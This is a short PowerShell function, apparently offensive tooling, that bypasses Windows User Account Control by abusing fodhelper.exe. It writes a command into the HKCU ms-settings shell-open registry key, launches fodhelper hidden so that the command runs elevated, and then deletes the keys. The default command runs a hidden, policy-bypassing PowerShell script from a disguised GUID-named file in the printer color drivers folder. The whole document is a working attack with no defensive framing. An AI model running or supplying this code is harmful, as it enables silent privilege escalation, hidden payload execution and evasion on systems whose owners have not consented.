function FodhelperUACBypass(){ 
 Param (
           
        [String]$program = 'cmd /c start C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -w 1 -File "C:\Windows\System32\spool\drivers\color\C9C5AF3B-0FE6-4BE8-AECA-2F962570AA91.ps1"' #default
       )
　
    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
　
    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
　
    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
　
}